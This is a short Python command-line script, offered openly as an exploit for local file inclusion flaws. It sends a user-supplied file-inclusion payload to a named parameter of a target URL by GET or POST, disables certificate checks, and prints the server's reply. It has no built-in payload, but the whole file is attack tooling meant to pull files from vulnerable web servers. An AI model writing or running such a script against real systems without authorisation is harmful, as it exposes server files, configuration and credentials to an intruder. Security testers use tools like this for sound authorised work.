#!/usr/bin/env python3.11
import requests
import urllib
import urllib3
import argparse

def exploit_lfi(url, param, lfi_payload, method="POST"):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    # URL encode the LFI payload
    lfi_payload = urllib.parse.quote(lfi_payload)
    # Send the LFI payload to the target url depending on the method
    if method.upper() == "POST":
        response = requests.post(url, data={param: lfi_payload}, verify=False)
    elif method.upper() == "GET":
        response = requests.get(f"{url}?{param}={lfi_payload}", verify=False)
    else:
        print("Unsupported method, try again...")
        return None
    # Check if the request was successful
    if response.status_code != 200:
        raise Exception("Failed to exploit LFI vulnerability")
    # Return the response
    return response

def main():
    # Parse the command line arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="The target url")
    parser.add_argument("param", help="The vulnerable parameter")
    parser.add_argument("lfi_payload", help="The LFI payload")
    parser.add_argument("method", choices=["GET","POST"], default="POST", help="HTTP Request type")
    args = parser.parse_args()
    # Exploit the LFI vulnerability
    response = exploit_lfi(args.url, args.param, args.lfi_payload, args.method)
    # Print the response
    print(response.text)

if __name__ == "__main__":
    main()
